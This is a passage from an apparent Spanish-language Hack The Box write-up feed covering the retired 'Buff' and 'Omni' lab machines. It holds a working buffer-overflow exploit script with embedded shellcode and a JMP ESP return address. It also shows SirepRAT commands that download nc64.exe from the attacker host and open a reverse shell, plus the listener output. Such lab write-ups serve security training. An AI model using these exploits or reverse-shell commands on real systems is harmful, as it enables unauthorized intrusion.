class=&quot;s2&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4a&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bf&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;49&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ae&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;94&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;9e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ee&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;75&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4f&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;92&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ea&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b3&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ef&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;56&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;51&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;94&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ef&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ac&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5e&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;47&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fe&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fe&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;7a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f6&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ac&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;pre&gt;&lt;code class=&quot;language-python3&quot;&gt;#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time

from pwn import *
from struct import pack


def def_handler(sig,frame):
        print(&quot;\n[*] Saliendo .. .&quot;)
        sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
remoteAddress = &quot;127.0.0.1&quot;

def executeExploit():

        shellcode = ( b&quot;\xdb\xc0\xb8\xd2\x0e\x7f\x2f\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1&quot;
                b&quot;\x52\x31\x42\x17\x83\xc2\x04\x03\x90\x1d\x9d\xda\xe8\xca\xe3&quot;
                b&quot;\x25\x10\x0b\x84\xac\xf5\x3a\x84\xcb\x7e\x6c\x34\x9f\xd2\x81&quot;
                b&quot;\xbf\xcd\xc6\x12\xcd\xd9\xe9\x93\x78\x3c\xc4\x24\xd0\x7c\x47&quot;
                b&quot;\xa7\x2b\x51\xa7\x96\xe3\xa4\xa6\xdf\x1e\x44\xfa\x88\x55\xfb&quot;
                b&quot;\xea\xbd\x20\xc0\x81\x8e\xa5\x40\x76\x46\xc7\x61\x29\xdc\x9e&quot;
                b&quot;\xa1\xc8\x31\xab\xeb\xd2\x56\x96\xa2\x69\xac\x6c\x35\xbb\xfc&quot;
                b&quot;\x8d\x9a\x82\x30\x7c\xe2\xc3\xf7\x9f\x91\x3d\x04\x1d\xa2\xfa&quot;
                b&quot;\x76\xf9\x27\x18\xd0\x8a\x90\xc4\xe0\x5f\x46\x8f\xef\x14\x0c&quot;
                b&quot;\xd7\xf3\xab\xc1\x6c\x0f\x27\xe4\xa2\x99\x73\xc3\x66\xc1\x20&quot;
                b&quot;\x6a\x3f\xaf\x87\x93\x5f\x10\x77\x36\x14\xbd\x6c\x4b\x77\xaa&quot;
                b&quot;\x41\x66\x87\x2a\xce\xf1\xf4\x18\x51\xaa\x92\x10\x1a\x74\x65&quot;
                b&quot;\x56\x31\xc0\xf9\xa9\xba\x31\xd0\x6d\xee\x61\x4a\x47\x8f\xe9&quot;
                b&quot;\x8a\x68\x5a\xbd\xda\xc6\x35\x7e\x8a\xa6\xe5\x16\xc0\x28\xd9&quot;
                b&quot;\x07\xeb\xe2\x72\xad\x16\x65\x77\x38\x08\x70\xef\x3e\x28\x7b&quot;
                b&quot;\x54\xb7\xce\x11\xba\x9e\x59\x8e\x23\xbb\x11\x2f\xab\x11\x5c&quot;
                b&quot;\x6f\x27\x96\xa1\x3e\xc0\xd3\xb1\xd7\x20\xae\xeb\x7e\x3e\x04&quot;
                b&quot;\x83\x1d\xad\xc3\x53\x6b\xce\x5b\x04\x3c\x20\x92\xc0\xd0\x1b&quot;
                b&quot;\x0c\xf6\x28\xfd\x77\xb2\xf6\x3e\x79\x3b\x7a\x7a\x5d\x2b\x42&quot;
                b&quot;\x83\xd9\x1f\x1a\xd2\xb7\xc9\xdc\x8c\x79\xa3\xb6\x63\xd0\x23&quot;
                b&quot;\x4e\x48\xe3\x35\x4f\x85\x95\xd9\xfe\x70\xe0\xe6\xcf\x14\xe4&quot;
                b&quot;\x9f\x2d\x85\x0b\x4a\xf6\xa5\xe9\x5e\x03\x4e\xb4\x0b\xae\x13&quot;
                b&quot;\x47\xe6\xed\x2d\xc4\x02\x8e\xc9\xd4\x67\x8b\x96\x52\x94\xe1&quot;
                b&quot;\x87\x36\x9a\x56\xa7\x12&quot;)

        offset = 1052
        antes_eip = b&quot;A&quot;*offset
        EIP = pack(&quot;&amp;lt;I&quot;, 0x68a98a7b) #JMP ESP
        nops = b&quot;\x90&quot;*16 # b&quot;\x83\xec\x10&quot;

        payload = antes_eip + EIP + nops + shellcode

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remoteAddress, 8888))
        s.send(payload)

if __name__ == &apos;__main__&apos;:

        executeExploit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez vemos que nos funciona el exploit en nuestra maquina local procedemos a cambiar la ip y el shellcode. 
Y lo ejecutamos en la maquina victima&lt;/p&gt;

&lt;p&gt;./chisel client 10.10.16.5:1233 R:8888:127.0.0.1:8888 conectamos&lt;/p&gt;

&lt;p&gt;./chisel server –reverse –port 1233 recibimos&lt;/p&gt;

&lt;p&gt;Ejecutamos el exploit&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# python3 exploit.py&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;roo.txt
78f9007b26a3846afxxxxxxxxxxxxxxxx&lt;/p&gt;</content><author><name>Pirrandi</name></author><category term="HTB," /><category term="Bypass," /><category term="BruteForce," /><category term="Web" /><category term="Hacking," /><category term="Maquinas" /><category term="Retiradas," /><category term="Writeup" /><summary type="html">BUFF ~ Hack The Box</summary></entry><entry><title type="html">OSCP Path ~ Omni de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2021/09/05/Omni.html" rel="alternate" type="text/html" title="OSCP Path ~ Omni de Hack The Box (Necesario VIP)" /><published>2021-09-05T00:00:00-03:00</published><updated>2021-09-05T00:00:00-03:00</updated><id>http://localhost:4000/2021/09/05/Omni</id><content type="html" xml:base="http://localhost:4000/2021/09/05/Omni.html">&lt;h1 id=&quot;lame--hack-the-box-to-oscp&quot;&gt;Lame ~ Hack The Box to OSCP&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.204       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos con el siguiente escaneo de Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE SERVICE     VERSION
135/tcp   open  msrpc    Microsoft Windows RPC
5985/tcp  open  upnp     Microsoft IIS httpd
8080/tcp  open  upnp     Microsoft IIS httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0D
|_  Basic &lt;span class=&quot;nv&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Windows Device Portal&quot;&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have a title.
29817/tcp open  unknown
29819/tcp open  arcserve ARCserve Discovery
29820/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port29820-TCP:V=7.91%I=7%D=9/3%Time=61327E98%P=x86_64-pc-linux-gnu%r(NU
SF:LL,10,&quot;\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&quot;)%r(GenericLines,10,&quot;\
SF:*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&quot;)%r(Help,10,&quot;\*LY\xa5\xfb`\x04
SF:G\xa9m\x1c\xc9}\xc8O\x12&quot;)%r(JavaRMI,10,&quot;\*LY\xa5\xfb`\x04G\xa9m\x1c\xc
SF:9}\xc8O\x12&quot;);
Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Buscamos que es el servicio ‘Windows Device Portal’ y concatenamos ‘exploit’ en la busqueda:&lt;/p&gt;

&lt;p&gt;Intrusion apartir del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SirepRAT&lt;/code&gt; → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows Device Portal RCE&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Lanzamos el siguiente comando en el exploit SireRAT para copiarnos el nc64.exe de nuestra maquina atacante a la maquina victima en la ruta ‘C:\Windows\Temp’&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &quot;powershell&quot; --args &quot; -c iwr -uri http://10.10.16.4/nc64.exe -OutFile C:\Windows\Temp\nc64.exe&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Una vez subido, vamos a proceder a ejecutarnos una R-Shell con nuestro binario nc64.exe&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root💀kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[/home/…/HTB/Onmi/nmap/SirepRAT]
└─# python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput &lt;span class=&quot;nt&quot;&gt;--return_output&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--cmd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;powershell&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--args&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; /c C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;emp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c64.exe -e cmd 10.10.16.4 443&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos ponemos a la escucha y procedemos a Recibir la conexion:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# rlwrap nc -vlnp 443                                                                                                                                         1 ⚙&lt;/span&gt;
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.16.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.204] 49670
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.17763.107]
Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Microsoft Corporation. All rights reserved.

&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; %USERNAME%
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; %USERNAME%
omni&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;

C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Enumeramos la maquina en busca de la flag de User.txt&lt;/p&gt;
